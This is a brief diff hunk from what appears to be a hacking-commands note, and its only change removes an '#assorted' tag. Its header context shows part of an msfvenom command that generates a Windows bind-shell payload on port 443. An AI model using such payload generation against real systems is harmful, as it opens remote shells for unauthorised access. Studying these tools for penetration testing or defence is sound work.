@@ -10,4 +10,4 @@ msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x
 
 Tags:
 
-    #assorted #command #hacking #msfvenom
+    #command #hacking #msfvenom 
